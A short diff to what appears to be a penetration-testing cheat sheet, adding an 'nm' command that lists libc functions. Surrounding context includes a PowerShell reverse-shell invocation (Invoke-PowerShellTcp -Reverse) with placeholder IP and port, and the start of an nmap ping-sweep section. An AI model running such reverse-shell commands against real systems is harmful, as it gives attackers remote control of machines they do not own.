@@ -3395,6 +3395,15 @@ Invoke-PowerShellTcp -Reverse -IPAddress IP_here -Port port_here
 
 
 
+## NM
+```bash
+# list functions from system library
+## libc
+nm -D /lib/$(uname -m)/libc-*.so | grep -vw U | grep -v "_" |cut -d " " -f 3
+```
+
+
+
 ## NMAP
 ```bash
 # ping sweep
